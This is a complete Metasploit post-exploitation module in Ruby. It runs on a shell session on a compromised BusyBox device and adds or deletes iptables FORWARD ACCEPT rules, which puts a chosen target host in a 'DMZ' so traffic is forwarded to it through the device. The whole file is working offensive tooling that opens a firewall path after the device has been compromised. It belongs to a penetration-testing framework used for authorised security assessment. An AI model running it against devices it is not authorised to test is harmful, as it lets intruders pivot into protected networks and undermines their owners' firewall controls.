##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize
    super(
      'Name'         => 'BusyBox DMZ Configuration',
      'Description'  => %q{
        This module will be applied on a session connected to a BusyBox shell. It allows to manage
        traffic forwarding to a target host through the BusyBox device.
      },
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )

     register_options([
      OptAddress.new('TARGET_HOST', [ true, 'The address of the target host']),
      OptBool.new('DELETE', [true, 'Remove host from the DMZ, otherwise will add it', false])
    ])
  end

  def run
    if datastore['DELETE']
      print_status("Deleting #{datastore['TARGET_HOST']} from DMZ")
      vprint_status(cmd_exec("iptables -D FORWARD -d #{datastore['TARGET_HOST']} -j ACCEPT"))
    else
      print_status("Adding #{datastore['TARGET_HOST']} to DMZ")
      vprint_status(cmd_exec("iptables -A FORWARD -d #{datastore['TARGET_HOST']} -j ACCEPT"))
    end

    vprint_status(cmd_exec('iptables --list'))
  end
end
